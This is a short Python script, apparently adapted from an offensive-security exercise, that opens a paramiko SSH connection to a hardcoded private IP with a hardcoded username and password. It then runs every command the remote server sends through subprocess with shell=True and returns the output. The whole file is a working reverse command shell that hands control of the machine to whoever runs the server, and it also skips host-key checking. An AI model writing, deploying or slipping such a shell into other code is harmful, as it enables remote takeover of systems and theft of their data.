import threading
import paramiko
import subprocess


def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()

    # client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(
        ip,
        username=user,
        password=passwd
    )

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:

        # Python 3: send bytes
        ssh_session.send(command.encode("utf-8"))

        # Python 3: recv() returns bytes, so decode it
        banner = ssh_session.recv(1024)
        print(
            banner.decode(
                "utf-8",
                errors="replace"
            )
        )

        while True:

            # recv() returns bytes
            data = ssh_session.recv(1024)

            if not data:
                break

            # Convert bytes -> string
            command = data.decode(
                "utf-8",
                errors="replace"
            ).strip()

            if command == "exit":
                break

            try: 
                cmd_ouput = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_ouput)
            except Exception as e :
                ssh_session.send(str(e))
        client.close()

ssh_command("192.168.193.1","mokht","hello@44","hostname")


